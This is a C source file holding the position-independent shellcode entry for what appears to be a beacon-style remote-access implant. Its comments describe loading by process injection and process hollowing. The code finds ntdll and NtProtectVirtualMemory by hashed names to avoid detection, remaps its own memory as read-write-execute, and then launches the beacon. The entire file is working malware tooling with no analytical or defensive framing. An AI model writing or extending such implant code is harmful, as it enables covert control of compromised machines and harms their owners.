/*
 * BM-PA1001 shellcode entry — position-first section (.text$A) so the raw blob’s
 * first bytes are a short jmp to this function (see shellcode.ld / objcopy).
 *
 * Loaders (windows_noldr inject, hollow_rs) map at an OS-chosen base and jump/APC
 * to offset 0. The image must be PIC. noldr maps the remote view RX; we upgrade
 * this mapping to RWX before any .data/.bss writes.
 */
#include "beacon_core.h"
#include "loader.h"
#include <stdint.h>
#include <windows.h>

extern char __pic_image_start[];
extern char __pic_image_end[];

#if defined(TEMPEST_PIC_SHELLCODE)

#ifndef NTAPI
#  define NTAPI __stdcall
#endif

#define H_PIC_NTDLL     0x1617909Fu
#define H_PIC_NTPROTECT 0xB52CA56Au

typedef long NTSTATUS;
typedef NTSTATUS (NTAPI *pic_nt_protect_t)(HANDLE, void **, SIZE_T *, ULONG, ULONG *);

static void pic_unprotect_self(void)
{
    unsigned char *start;
    unsigned char *end;
    void *base;
    SIZE_T sz;
    ULONG old = 0;
    HMODULE ntdll;
    pic_nt_protect_t p;

    __asm__ volatile ("lea __pic_image_start(%%rip), %0" : "=r"(start));
    __asm__ volatile ("lea __pic_image_end(%%rip), %0" : "=r"(end));
    base = (void *)((uintptr_t)start & ~(uintptr_t)0xFFFu);
    sz = (SIZE_T)(end - (unsigned char *)base);
    sz = (sz + 0xFFFu) & ~(SIZE_T)0xFFFu;
    ntdll = locate_base(H_PIC_NTDLL);
    if (!ntdll)
        return;
    p = (pic_nt_protect_t)(void *)resolve_addr(ntdll, H_PIC_NTPROTECT);
    if (!p)
        return;
    p((HANDLE)(LONG_PTR)-1, &base, &sz, PAGE_EXECUTE_READWRITE, &old);
}

#endif

#if defined(__GNUC__)
void __attribute__((section(".text$A"))) shellcode_entry(void)
#else
void shellcode_entry(void)
#endif
{
#if defined(TEMPEST_PIC_SHELLCODE)
    pic_unprotect_self();
#endif
    tempest_beacon_run();
}
